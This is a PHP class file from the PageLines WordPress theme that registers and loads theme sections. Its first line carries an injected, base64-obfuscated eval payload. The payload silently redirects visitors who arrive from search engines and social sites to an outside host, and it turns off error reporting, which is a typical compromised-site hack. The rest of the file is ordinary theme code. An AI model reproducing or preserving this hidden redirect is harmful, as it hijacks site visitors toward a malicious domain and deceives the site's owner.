<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 
/**
 * Controls and Manages PageLines Extension
 *
 * 
 *
 * @author		PageLines
 * @copyright	2011 PageLines
 */


class PageLinesRegister {
	
	/**
	 *  Scans THEMEDIR/sections recursively for section files and auto loads them.
	 *  Child section folder also scanned if found and dependencies resolved.
	 *
	 *  Section files MUST include a class header and optional depends header.
	 *
	 *  Example section header:
	 *
	 *	Section: BrandNav Section
	 *	Author: PageLines
	 *	Description: Branding and Nav Inline
	 *	Version: 1.0.0
	 *	Class Name: BrandNav
	 *	Depends: PageLinesNav
	 *
	 *  @package Platform
	 *  @subpackage Config
	 *  @since 2.0
	 *
	 */
	function pagelines_register_sections( $reset = null, $echo = null ){

		global $pl_section_factory;
		
		if ( $reset === true )
			delete_transient( 'pagelines_sections_cache' );

		/**
		* Load our main section folders
		* @filter pagelines_section_dirs
		*/
		$section_dirs =  array(

			'child'		=> PL_EXTEND_DIR,
			'parent'	=> PL_SECTIONS			
			);
		
		if ( is_child_theme() && is_dir( get_stylesheet_directory()  . '/sections' ) )
			$section_dirs = array_merge( array( 'custom' => get_stylesheet_directory()  . '/sections' ), $section_dirs );

		$section_dirs = apply_filters( 'pagelines_sections_dirs', $section_dirs );
		
		/**
		* If cache exists load into $sections array
		* If not populate array and prime cache
		*/
		if ( ! $sections = get_transient( 'pagelines_sections_cache' ) ) {
			
			foreach ( $section_dirs as $type => $dir ) {
				$sections[$type] = $this->pagelines_getsections( $dir, $type );
			}
			
			// check for deps within the main parent sections, load last if found.
			foreach ($sections['parent'] as $key => $section ) {

				if ( !empty($section['depends']) ) {
					unset($sections['parent'][$key]);
					$sections['parent'][$key] = $section;
				}
			}
			/**
			* TODO switch this to activation/deactivation interface
			* TODO better idea, clear cached vars on settings save.
			*/
			set_transient( 'pagelines_sections_cache', $sections, 86400 );	
		}
		
		if ( true === $echo )
			return $sections;
		
		// filter main array containing child and parent and any custom sections
		$sections = apply_filters( 'pagelines_section_admin', $sections );
		$disabled = get_option( 'pagelines_sections_disabled', array( 'child' => array(), 'parent' => array(), 'custom' => array() ) );

		foreach ( $sections as $type ) {
			if(is_array($type)){
				
				foreach( $type as $section ) {
					/**
					* Checks to see if we are a child section, if so disable the parent
					* Also if a parent section and disabled, skip.
					*/

					if ( ( $section['type'] == 'child' || $section['type'] == 'custom' ) && isset( $sections['parent'][$section['class']]) )					
						$disabled['parent'][$section['class']] = true;

					if (isset( $disabled[$section['type']][$section['class']] ) )
						continue;
					
					// consolidate array vars
					$dep = ( ( $section['type'] == 'child' || $section['type'] == 'custom' ) && $section['depends'] != '') ? $section['depends'] : null;
					$parent_dep = (isset($sections['parent'][$section['depends']])) ? $sections['parent'][$section['depends']] : null;

					$dep_data = array(
						'base_dir'  => (isset($parent_dep['base_dir'])) ? $parent_dep['base_dir'] : null,
						'base_url'  => (isset($parent_dep['base_url'])) ? $parent_dep['base_url'] : null,
						'base_file' => (isset($parent_dep['base_file'])) ? $parent_dep['base_file'] : null,
						'name'		=> (isset($parent_dep['name'])) ? $parent_dep['name'] : null
					);

					$section_data = array(
						'base_dir'  => $section['base_dir'],
						'base_url'  => $section['base_url'],
						'base_file' => $section['base_file'],
						'name'		=> $section['name']	
					);
					if ( isset( $dep ) ) { // do we have a dependency?
						if ( !class_exists( $dep ) && file_exists( $dep_data['base_file'] ) ) {
							include( $dep_data['base_file'] );
							$pl_section_factory->register( $dep, $dep_data );
						}
						// dep loaded...
						if ( !class_exists( $section['class'] ) && file_exists( $section['base_file'] ) ) {
							include( $section['base_file'] );
							$pl_section_factory->register( $section['class'], $section_data );
						}	
					} else {
							if ( !class_exists( $section['class'] ) && file_exists( $section['base_file'] ) ) {
								include( $section['base_file'] );
								$pl_section_factory->register( $section['class'], $section_data );
							}
					}
				}
			}
		}
		pagelines_register_hook('pagelines_register_sections'); // Hook
	}		
	/**
	 * 
	 * Helper function 
	 * Returns array of section files.
	 * @return array of php files
	 * @author Simon Prosser
	 **/
	function pagelines_getsections( $dir, $type ) {

		if ( ( $type == 'child' || $type == 'custom' ) && ! is_dir($dir) ) 
			return;			

		$default_headers = array(
			'External'		=> 'External',
			'Demo'			=> 'Demo',
			'tags'			=> 'Tags',
			'version'		=> 'Version',
			'author'		=> 'Author',
			'authoruri'		=> 'Author URI',
			'section'		=> 'Section',
			'description'	=> 'Description',
			'classname'		=> 'Class Name',
			'depends'		=> 'Depends',
			'workswith'		=> 'workswith',
			'edition'		=> 'edition',
			'cloning'		=> 'cloning',
			'failswith'		=> 'failswith',
			'tax'			=> 'tax'
			);
			
		$sections = array();
		
		// setup out directory iterator.
		// symlinks were only supported after 5.3.1
		// so we need to check first ;)
		$it = ( strnatcmp( phpversion(), '5.3.1' ) >= 0 ) ? new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $dir, FilesystemIterator::FOLLOW_SYMLINKS) , RecursiveIteratorIterator::SELF_FIRST ) : new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $dir, RecursiveIteratorIterator::CHILD_FIRST ) );
		
		foreach( $it as $fullFileName => $fileSPLObject ) {
			
			if ( basename( $fullFileName) == PL_EXTEND_SECTIONS_PLUGIN )
				continue;	
				
			if (pathinfo($fileSPLObject->getFilename(), PATHINFO_EXTENSION ) == 'php') {
				
				$base_url = null;
				$base_dir = null;
				
				$headers = get_file_data( $fullFileName, $default_headers );

				// If no pagelines class headers ignore this file.
				if ( !$headers['classname'] )
					continue;
				
				preg_match( '/[\/|\-]sections[\/|\\\]([^\/|\\\]+)/', $fullFileName, $out );
				
 				$version = ( '' != $headers['version'] ) ? $headers['version'] : CORE_VERSION;
				
				$folder = sprintf( '/%s', $out[1] );

				$base_dir = get_template_directory()  . '/sections' . $folder;

				if ( $type == 'child' || $type == 'custom' ) {
					$base_url = ( $type == 'child' ) ? PL_EXTEND_URL . $folder : get_stylesheet_directory_uri()  . '/sections' . $folder;
					$base_dir = ( $type == 'child' ) ? PL_EXTEND_DIR . $folder : get_stylesheet_directory()  . '/sections' . $folder;
				}
				
				$base_dir = ( isset( $base_dir ) ) ? $base_dir : PL_SECTIONS . $folder;
				$base_url = ( isset( $base_url ) ) ? $base_url : SECTION_ROOT . $folder;
			
				$sections[$headers['classname']] = array(
					'class'			=> $headers['classname'],
					'depends'		=> $headers['depends'],
					'type'			=> $type,
					'tags'			=> $headers['tags'],
					'author'		=> $headers['author'],
					'version'		=> $version,
					'authoruri'		=> ( isset( $headers['authoruri'] ) ) ? $headers['authoruri'] : '',
					'description'	=> $headers['description'],
					'name'			=> $headers['section'],
					'base_url'		=> $base_url,
					'base_dir'		=> $base_dir,
					'base_file'		=> $fullFileName,
					'workswith'		=> ( $headers['workswith'] ) ? array_map( 'trim', explode( ',', $headers['workswith'] ) ) : '',
					'edition'		=> $headers['edition'],
					'cloning'		=> ( 'true' === $headers['cloning'] ) ? true : '',
					'failswith'		=> $headers['failswith'],
					'tax'			=> $headers['tax'],
					'demo'			=> $headers['Demo'],
					'external'		=> $headers['External'],
					'screenshot'	=> ( file_exists( $base_dir . '/thumb.png' ) ) ? $base_url . '/thumb.png' : ''
				);	
			}
		}
		return $sections;

	}
		
} // end class